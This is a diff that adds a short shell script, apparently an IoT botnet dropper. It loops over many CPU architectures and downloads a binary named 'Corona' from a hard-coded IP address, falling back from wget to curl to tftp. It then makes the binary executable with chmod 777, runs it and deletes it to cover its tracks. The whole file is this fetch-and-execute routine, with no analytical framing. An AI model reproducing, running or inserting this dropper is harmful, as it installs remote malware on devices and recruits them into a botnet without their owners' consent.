@@ -1,0 +1,12 @@
+binarys="mips mipsel x86_64 arm7 arm4 sh4 arm6 arm5 ppc"
+server_ip="194.180.48.55"
+binname="Corona"
+
+for arch in $binarys
+do
+rm -rf $binname.$arch
+wget http://$server_ip/$binname.$arch || curl -O http://$server_ip/$binname.$arch || tftp $server_ip -c get $binname.$arch || tftp -g -r $binname.$arch $server_ip
+chmod 777 $binname.$arch
+./$binname.$arch $1.$arch
+rm -rf $binname.$arch
+done
